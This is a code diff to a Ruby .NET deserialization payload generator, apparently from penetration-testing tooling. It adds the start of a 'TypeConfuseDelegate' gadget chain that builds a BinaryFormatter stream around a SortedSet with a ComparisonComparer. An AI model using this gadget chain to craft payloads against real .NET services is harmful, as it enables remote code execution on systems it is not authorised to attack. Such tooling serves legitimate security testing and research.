@@ -131,7 +131,7 @@ module DotNetDeserialization
             member_names: ['ForegroundBrush']
           ),
           member_type_info: Types::General::MemberTypeInfo.new(
-            binary_type_enums: [Enums::BinaryTypeEnum[:String]]
+            binary_type_enums: [Enums::BinaryTypeEnum.fetch(:String)]
           ),
           library_id: library.library_id,
           member_values: [
@@ -139,6 +139,42 @@ module DotNetDeserialization
           ]
         ),
         Types::RecordValues::MessageEnd.new
+      ])
+    when :TypeConfuseDelegate
+      library = Types::RecordValues::BinaryLibrary.new(
+        library_id: 2,
+        library_name: "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+      )
+      serialized = Types::SerializedStream.from_values([
+        Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
+        library,
+        Types::RecordValues::ClassWithMembersAndTypes.from_member_values(
+          class_info: Types::General::ClassInfo.new(
+            obj_id: 1,
+            name: 'System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]',
+            member_names: ['Count', 'Comparer', 'Version', 'Items']
+          ),
+          member_type_info: Types::General::MemberTypeInfo.new(
+            binary_type_enums: [
+              Enums::BinaryTypeEnum.fetch(:Primitive),
+              Enums::BinaryTypeEnum.fetch(:SystemClass),
+              Enums::BinaryTypeEnum.fetch(:Primitive),
+              Enums::BinaryTypeEnum.fetch(:StringArray)
+            ],
+            additional_infos: [
+              Enums::PrimitiveTypeEnum.fetch(:Int32),
+              'System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]',
+              Enums::PrimitiveTypeEnum.fetch(:Int32)
+            ]
+          ),
+          library_id: library.library_id,
+          member_values: [
+            2,
+            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 3)),
+            2,
+            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 4))
+          ]
+        )
       ])
     else
       raise NotImplementedError, 'The specified gadget chain is not implemented'
